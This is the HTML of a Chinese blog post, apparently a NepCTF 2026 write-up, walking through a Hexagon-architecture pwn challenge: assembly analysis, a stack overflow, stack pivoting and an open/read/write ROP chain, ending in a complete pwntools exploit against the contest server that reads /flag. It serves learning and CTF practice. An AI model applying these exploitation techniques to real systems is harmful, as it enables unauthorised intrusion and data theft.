+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">142</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/notice" aria-label="公告"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">公告</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-nepctf-2026-pwn" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-08-05T13:30:00.000Z" itemprop="datePublished">2026-08-05</time>
+    <time style="display: none;" id="post-update-time">2026-08-05</time>
+  </span>
+    <span class="article-date-link icon-calendar-plus" data-aos="zoom-in">
+      <time datetime="2026-08-05T13:33:15.726Z" itemprop="dateModified">2026-08-05</time>
+    </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <p>前言：最近在同学家玩，忙里偷闲打一打 nepctf，纯手搓的 wp，能不能给我个惊喜嘿嘿 ^_^</p>
+<p>其实打这场比赛主要是为了学一点新知识，大一结束了，转头发现其实大一也没打过什么有意思的比赛，nep 的口碑一直挺不错的，想着学习学习。开了四个 pwn 两个 re 和一个 web 还有一个 realworld，其中 realworld 和一个 re 是直接让 ai 打得，不得不感叹 ai 确实是比人强得多，感觉除了强之外还有快，让所有 ctfer 在比赛当中为了拿血或高分不得不使用 ai 自动化开题，不过像这种公益性的比赛，我决定在自己学习的方向还是古法，途中也确实借助了大模型给出不少思路，这些思路也可以去学习，思考为什么这么去做，怎么能够想到这么去做，将 ai 当成一个合理学习的工具。</p>
+<p>虽然这一次开题非常慢，也没有拿到一个较高的排名，但是很高兴的是能够靠自己手开出来这些题目，这种愉悦感还是很久违了，之前打比赛一直就是自动化开。</p>
+<p>简单总结了三道 pwn 的做题思路，由于在同学家玩，乐不思蜀了属于是，写 wp 比较懒散，js 那道题的话之后会总结到博客上。</p>
+<hr>
+<h2 id="different-ROP"><a href="#different-ROP" class="headerlink" title="different_ROP"></a>different_ROP</h2><h3 id="解题记录："><a href="#解题记录：" class="headerlink" title="解题记录："></a>解题记录：</h3><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784297436322-284c6ae3-2b4c-4ffc-8044-ec786776ebdd.png"></p>
+<p>话说这道题目是 Hexagon 架构的，之前 VN2025 出过一道该架构的题目，但这场比赛的题目没有复现过，因此一开始写这道题目的时候也确实是有点束手无策了，那么就先学一点这个架构的知识。</p>
+<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784298583245-1c55bf4d-e821-40ac-ae16-59e8814d5ebc.png"></p>
+<p>先看一下题目，其实这里一开始打开还以为是常规的 x32pwn 哈哈，直到 IDA 打不开了才发现不是正常架构</p>
+<p>于是搜了一下 QUALCOMM DSP6：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784298715295-0d09a1e4-3afb-4cb2-8d8b-42144fd4cd2d.png"></p>
+<p>最开始尝试用 IDA 打开这个题目去分析，却发现没有 ida-hexagon 插件打不开，于是先去装了个插件：<br><a target="_blank" rel="noopener" href="https://github.com/gsmk/hexagon">https://github.com/gsmk/hexagon</a></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784297814209-c3bf499e-000c-4bef-a8c5-b895c831dd4a.png"></p>
+<p>很可惜，打开之后不支持 F5 伪代码，那就只能去看汇编找溢出了，像这种异构 pwn 基本上都是找栈溢出，简单看了一下汇编代码，像是 mips 架构和 x64 的架构的混合版 emmmm，还是先去学习一下 hexagon 架构汇编：</p>
+<h4 id="学习-hexagon："><a href="#学习-hexagon：" class="headerlink" title="学习 hexagon："></a>学习 hexagon：</h4><p>依靠 x64 架构来学习 hexgon 还是比较快的：实际上差别也就是寄存器上了，调用原理都大差不差</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r0 r1 r2 r3 ...  -&gt;   rax rbx rcx rdx </span><br><span class="line">fp               -&gt;   rbp </span><br><span class="line">sp               -&gt;   rsp </span><br><span class="line">lr               -&gt;   ret, addr; lr 是 link register，函数调用返回地址通常放在这里</span><br><span class="line">pc               -&gt;   rip</span><br></pre></td></tr></table></figure>
+
+<p>学这么多差不多够了吧(心虚) emmmm……，开干</p>
+<h4 id="IDA-静态分析："><a href="#IDA-静态分析：" class="headerlink" title="IDA 静态分析："></a>IDA 静态分析：</h4><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784298321174-222e5170-1c9b-4890-a816-6d87ab6f9d27.png"></p>
+<p>打开直接进入 start 函数，那么首要任务是去寻找 main 函数，但这里并没有被反编译出来，运行一下pwn文件：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784298422847-e4f88622-119b-4178-8b72-bd2e3f4a1f02.png"></p>
+<p>找到 hint：</p>
+<ul>
+<li>Hint: on amd64 Linux, arguments travel through real registers.</li>
+<li>Hint: if a file is the goal, open&#x2F;read&#x2F;write is usually quieter than a shell.</li>
+</ul>
+<p>因此有了初步的想法：打 ORW，IDA 直接找字符串定位 main 函数：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784298810708-79ca3638-5b82-4c6c-bd15-8b7a55fbb7b0.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784298861703-74569b2f-d11b-4af1-b931-e72f055f38a9.png"></p>
+<p>找一下交叉引用：Ctrl + X，于是乎直接找到了菜单</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784298892881-9a948bf9-7303-4c24-b962-3dcc1ac442c6.png"></p>
+<p>继续查找一下 sub_21350 函数的交叉引用：  </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784298926670-dc7efcfa-9b68-4c95-a357-1dc228efc59f.png"></p>
+<p>进入到了 loc_21228 那么这里应该就是 main 函数了吧？读一读汇编：  </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784299230633-391023d9-be1b-4440-b671-c4d2102f07d9.png"></p>
+<p>上来就是调用菜单，我们改名为 menu：先分析这一部分</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00021228                 &#123; call menu &#125;</span><br><span class="line">.text:0002122C                 &#123; r0 = add(fp, #-0x18) &#125;</span><br><span class="line">.text:00021230                 &#123; r1 = #0x10 &#125;</span><br><span class="line">.text:00021234                 &#123; call sub_213B0 &#125;</span><br></pre></td></tr></table></figure>
+
+<p>猜测这里是读菜单输入，最多读 0x10 字节到 fp - 0x18，这个地方没有明显溢出。</p>
+<p>之后会调用 <code>sub_213B0</code>，瞅一瞅：刚才是猜测，这里来验证一下这个函数：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784299799493-9b9cb5d0-8530-4a62-8669-5635b2af5dea.png"></p>
+<p>没什么看下去的欲望，让 ai 分析了一份伪 C 代码：就是一个简单读取</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sub_213B0</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (fgets(buf, size, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;input closed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buf[<span class="built_in">strcspn</span>(buf, <span class="string">&quot;\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>  然后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00021238                 &#123; r0 = memub(fp + #var_18) &#125;</span><br><span class="line">.text:0002123C                 &#123; r0 = add(r0, #-0x31) &#125;</span><br><span class="line">.text:00021244                 &#123; p0 = cmp.gtu(r0, #4) &#125;</span><br><span class="line">.text:00021248                 &#123; if (p0) jump loc_21298 &#125;</span><br></pre></td></tr></table></figure>
+
+<p>memub 是 memory unsigned byte ：从内存读取 1 字节，并按无符号数扩展到寄存器</p>
+<p>那就从 fp 寄存器读取一个字节，这里指的是我们输入的字符，-0x31，r 之后发现 0x31 实际上就是 1：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784300674633-8f3f8ec5-f077-4af9-a843-1889bfd9e2b4.png"></p>
+<p>也就是 r0 &#x3D; r0-1</p>
+<p>接着： <code>.text:00021244  { p0 = cmp.gtu(r0, #4) }</code></p>
+<p>无符号比较 cmp.gtu：<code>p0 = (r0 &gt; 4)</code>，如果大于 4，说明不是合法菜单项，跳到 loc_21298，是个报错信息</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784300891660-0dc3762e-89bf-4f9a-83ac-075da0638360.png"></p>
+<p>若报错会返回 main 函数的最开始</p>
+<p>ok、分析到了这里也就大概知道前面其实就是一个读取菜单 index 的服务，就没必要再继续分析了，按理来说漏洞点肯定在菜单函数指向的 12345 当中的函数，也就是这里：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784301488756-d9c0689f-febf-4dc0-8e5f-b82161933e0a.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入 1 -&gt; 0x21264 -&gt; call sub_21430</span><br><span class="line">输入 2 -&gt; 0x2126C -&gt; call sub_21490</span><br><span class="line">输入 3 -&gt; 0x21274 -&gt; call sub_21590  </span><br><span class="line">输入 4 -&gt; 0x2127C -&gt; call sub_21600</span><br><span class="line">输入 5 -&gt; 0x21284 -&gt; lab closed</span><br></pre></td></tr></table></figure>
+
+<h4 id="运行-pwn-文件结合分析："><a href="#运行-pwn-文件结合分析：" class="headerlink" title="运行 pwn 文件结合分析："></a>运行 pwn 文件结合分析：</h4><p>直接读汇编难度还是太大了，运行 pwn 文件能节省很多时间：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784301714324-4ba674f8-a256-4db0-bcaf-b148f0c654bc.png"></p>
+<p>我们发现 1 实际上是直接打印，2 和 3 会让你输入一些东西，4 是 hint，5 是 exit</p>
+<p>那么就是说漏洞 ORW 只存在于 2 和 3，</p>
+<p>然而 2 叫做 set fake ROP register，并给出警告：stored. still no such architectural register, though</p>
+<p>让我们不要把他当作真是寄存器利用，也就是 2 也是无效的，那么漏洞点只能存在于 3 了。</p>
+<h4 id="准备-K-题"><a href="#准备-K-题" class="headerlink" title="准备 K 题"></a>准备 K 题</h4><p>我们现在明确了大致方向，漏洞点在 3，且利用手法是 ORW，分析一下 3：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784302149722-4921a0aa-3b5f-4db5-b4f9-f9be410469c2.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x215B8  r0 = #0</span><br><span class="line">0x215BC  r1 = add(fp, #-0x30)</span><br><span class="line">0x215C0  r2 = #0x40</span><br><span class="line">0x215C4  call sub_2B8C0</span><br></pre></td></tr></table></figure>
+
+<p>漏洞主要在这几行，sub_2B8C0 实际上类似于 read 函数</p>
+<p>简单描述就是<code>read(0, fp - 0x30, 0x40);</code>，那么很明显，给了 0x30 的缓冲区却可以写 0x40 的内容</p>
+<p>有栈溢出，写入长度又不够，那就很明显的栈迁移再打 ORW 喽</p>
+<h3 id="EXP-思路："><a href="#EXP-思路：" class="headerlink" title="EXP 思路："></a>EXP 思路：</h3><p>异构 pwn 和常见的 pwn 来说无非是寄存器不同，调用原理是基本一致的因此按照 32 位栈迁移+ORW 打即可：</p>
+<p>打栈迁移养成好习惯，时刻记录 rbp：</p>
+<h4 id="先做一些准备工作"><a href="#先做一些准备工作" class="headerlink" title="先做一些准备工作"></a>先做一些准备工作</h4><p>我们在 ORW 的时候是需要 syscall 调用的，需要找到类似于 pop_eax 这类的 gadgets，结果找到了这么一段：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784313714518-fb332500-a380-4dbb-8a3f-33070b4e96df.png"></p>
+<p>有点类似于 csu 的那个样子，可以帮我们分配 r6、r0、r1、r2 寄存器，var 就是负偏移栈变量名</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fp + var_14 = fp - <span class="number">0x14</span></span><br><span class="line">fp + var_18 = fp - <span class="number">0x18</span></span><br><span class="line">fp + var_1C = fp - <span class="number">0x1c</span></span><br><span class="line">fp + var_20 = fp - <span class="number">0x20</span></span><br></pre></td></tr></table></figure>
+
+<p>这下我们调用 syscall 的时候就可以随意传参了</p>
+<h4 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1 = flat(&#123;</span><br><span class="line">        <span class="number">0x30</span>: p(bss + <span class="number">0x30</span>),</span><br><span class="line">        <span class="number">0x34</span>: p(<span class="number">0x215b8</span>),</span><br><span class="line">    &#125;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>想要打 ORW 就必须保证可读可写，因此需要先迁移到 .bss 段上，修改一下 fp 然后跳回 read 函数</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784305631680-741cb418-c9c6-45c6-ad61-827e1625f91c.png"></p>
+<p>此时 fp &#x3D; bss + 0x30，执行 read(0, fp-0x30, 0x40) 就直接写到 .bss 段上了。</p>
+<p>那么接下来又存在一个问题：这个 read 只有 0x40 的大小可写，我们想要构造 ORW 的 payload 显然要远远超出这个长度，那么这个问题该如何解决？</p>
+<h4 id="syscall-调用-read"><a href="#syscall-调用-read" class="headerlink" title="syscall 调用 read"></a>syscall 调用 read</h4><p>前面提到我们有 syscall 这个 gadgets 就可以进行其他的系统调用，我们就可以构造一个足够大的 read</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">syscall = <span class="number">0x21ab8</span></span><br><span class="line">bss = <span class="number">0x4be00</span></span><br><span class="line">addr = bss + <span class="number">0x100</span></span><br><span class="line">read = <span class="number">63</span></span><br><span class="line"></span><br><span class="line">payload2 = flat(&#123;</span><br><span class="line">        <span class="number">0x00</span>: p32(<span class="number">0x400</span>),</span><br><span class="line">        <span class="number">0x04</span>: p32(addr),</span><br><span class="line">        <span class="number">0x08</span>: p32(<span class="number">0</span>),</span><br><span class="line">        <span class="number">0x0c</span>: p32(read),</span><br><span class="line">        <span class="number">0x20</span>: p32(addr + <span class="number">0x20</span>),</span><br><span class="line">        <span class="number">0x24</span>: p32(syscall),</span><br><span class="line">        <span class="number">0x30</span>: p32(bss + <span class="number">0x20</span>),</span><br><span class="line">        <span class="number">0x34</span>: p32(syscall),</span><br><span class="line">    &#125;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>在 .bss 段构造如上 payload2，在 read 结束后的 fp &#x3D; .bss + 0x30，最后会走到 dealloc_return</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784313093161-a2e50ce7-8df3-4a06-bfc3-0699c007701f.png"></p>
+<p>因此会执行 saved fp &#x3D; *(bss + 0x30)，leave，ret</p>
+<p>因此 fp &#x3D; bss+0x20，且跳转到 bss+0x20，之后执行 syscall，根据其调用规则再去构造一个 read</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fp + var_14 = fp - <span class="number">0x14</span></span><br><span class="line">fp + var_18 = fp - <span class="number">0x18</span></span><br><span class="line">fp + var_1C = fp - <span class="number">0x1c</span></span><br><span class="line">fp + var_20 = fp - <span class="number">0x20</span></span><br></pre></td></tr></table></figure>
+
+<p>为了构造<code>read(0, addr, 0x400)</code>，就在 payload2 的一开始构造这样的 rop</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00</span>: p32(<span class="number">0x400</span>),</span><br><span class="line"><span class="number">0x04</span>: p32(addr),</span><br><span class="line"><span class="number">0x08</span>: p32(<span class="number">0</span>),</span><br><span class="line"><span class="number">0x0c</span>: p32(read),</span><br></pre></td></tr></table></figure>
+
+<p>在这次<code>read(0, addr, 0x400)</code>我们就可以构造最后的 ORW 了</p>
+<p>但是不要忘记在这次 syscall(read)结束之后还需要继续 saved fp &#x3D; *(bss + 0x20)，leave，ret</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x20</span>: p32(addr + <span class="number">0x20</span>),</span><br><span class="line"><span class="number">0x24</span>: p32(syscall),</span><br></pre></td></tr></table></figure>
+
+<p>因此给足 0x20 的大小放参数即可：p32(addr + 0x20)</p>
+<h4 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload3 = (</span><br><span class="line">    p32(<span class="number">0</span>) + p32(path) + p32(<span class="number">0</span>) + p32(openat) + <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span> + p32(addr + <span class="number">0x40</span> + <span class="number">0x20</span>) + p32(syscall) + <span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span> +</span><br><span class="line">    p32(<span class="number">0x100</span>) + p32(buf) + p32(<span class="number">3</span>) + p32(read) + <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span> + p32(addr + <span class="number">0x80</span> + <span class="number">0x20</span>) + p32(syscall) + <span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span> +</span><br><span class="line">    p32(<span class="number">0x100</span>) + p32(buf) + p32(<span class="number">2</span>) + p32(write) + <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span> + p32(<span class="number">0x20</span>) + p32(syscall) + <span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>这里就直接放 ORW 链子了，相信能写到这一步的人写个 ORW 肯定是比较轻松了，不多做解释了</p>
+<h3 id="总-EXP："><a href="#总-EXP：" class="headerlink" title="总 EXP："></a>总 EXP：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;error&quot;</span></span><br><span class="line">io = remote(<span class="string">&quot;7lq4vmx8-yxhz-uwfa-gyib-6a5a7b3431118-neptune.nepctf.com&quot;</span>,<span class="number">443</span>,ssl=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># ncat --ssl 7lq4vmx8-yxhz-uwfa-gyib-6a5a7b3431118-neptune.nepctf.com 443</span></span><br><span class="line">syscall = <span class="number">0x21ab8</span></span><br><span class="line">bss = <span class="number">0x4be00</span></span><br><span class="line">addr = bss + <span class="number">0x100</span></span><br><span class="line">path = bss + <span class="number">0x280</span></span><br><span class="line">buf = bss + <span class="number">0x300</span></span><br><span class="line">openat = <span class="number">56</span></span><br><span class="line">read = <span class="number">63</span></span><br><span class="line">write = <span class="number">64</span></span><br><span class="line"></span><br><span class="line">payload1 = flat(&#123;</span><br><span class="line">        <span class="number">0x30</span>: p32(bss + <span class="number">0x30</span>),</span><br><span class="line">        <span class="number">0x34</span>: p32(<span class="number">0x215b8</span>),</span><br><span class="line">    &#125;,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload2 = flat(&#123;</span><br><span class="line">        <span class="number">0x00</span>: p32(<span class="number">0x400</span>),</span><br><span class="line">        <span class="number">0x04</span>: p32(addr),</span><br><span class="line">        <span class="number">0x08</span>: p32(<span class="number">0</span>),</span><br><span class="line">        <span class="number">0x0c</span>: p32(read),</span><br><span class="line">        <span class="number">0x20</span>: p32(addr + <span class="number">0x20</span>),</span><br><span class="line">        <span class="number">0x24</span>: p32(syscall),</span><br><span class="line">        <span class="number">0x30</span>: p32(bss + <span class="number">0x20</span>),</span><br><span class="line">        <span class="number">0x34</span>: p32(syscall),</span><br><span class="line">    &#125;,</span><br><span class="line">    length=<span class="number">0x40</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload3 = (</span><br><span class="line">    p32(<span class="number">0</span>) + p32(path) + p32(<span class="number">0</span>) + p32(openat) + <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span> + p32(addr + <span class="number">0x40</span> + <span class="number">0x20</span>) + p32(syscall) + <span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span> +</span><br><span class="line">    p32(<span class="number">0x100</span>) + p32(buf) + p32(<span class="number">3</span>) + p32(read) + <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span> + p32(addr + <span class="number">0x80</span> + <span class="number">0x20</span>) + p32(syscall) + <span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span> +</span><br><span class="line">    p32(<span class="number">0x100</span>) + p32(buf) + p32(<span class="number">2</span>) + p32(write) + <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span> + p32(<span class="number">0x20</span>) + p32(syscall) + <span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">)</span><br><span class="line">payload3 = payload3.ljust(path - addr, <span class="string">b&quot;a&quot;</span>) + <span class="string">b&quot;/flag\x00&quot;</span></span><br><span class="line">payload3 = payload3.ljust(<span class="number">0x400</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&quot;note&gt; &quot;</span>, payload1)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.send(payload3)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784314924260-d3b523d5-d5f1-46c4-b13c-0e53e1c393f2.png"></p>
+<h2 id="onlyone"><a href="#onlyone" class="headerlink" title="onlyone"></a>onlyone</h2><p>总而言之这道题目打下来给人感觉是东西太多了，添加了父子进程和管道，一开始写的时候就懵着写，读懂程序花了不少时间 emmm，不过好在还是很有收获的一道题目 ^_^</p>
